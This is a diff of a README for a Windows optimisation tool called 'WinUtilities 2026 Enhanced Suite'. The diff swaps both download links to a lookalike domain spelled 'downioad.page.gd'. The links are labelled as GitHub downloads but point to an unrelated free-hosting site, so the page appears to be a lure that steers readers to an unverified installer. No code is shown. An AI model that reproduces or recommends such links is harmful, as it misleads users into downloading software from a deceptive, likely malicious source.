@@ -2,7 +2,7 @@
 
 WinUtilities 2026 Enhanced Suite is a powerful all-in-one solution designed for Windows 10 and 11 users to streamline system maintenance and boost performance. This tool integrates a variety of utilities to clean up disk space, repair registry issues, and enhance privacy, making it an essential addition to your desktop toolkit. Whether you're a casual user or an IT enthusiast, WinUtilities 2026 provides an intuitive interface to keep your computer running smoothly.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -70,6 +70,6 @@ A: No, WinUtilities 2026 is designed to be non-intrusive. It targets only tempor
 
 For the latest version of WinUtilities 2026 Enhanced Suite, please visit the official download page. Click the link below to get started with optimizing your system today.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: 2026-01-15. This repository is maintained for educational and utility purposes only. All features are intended for legitimate system maintenance on Windows desktops.
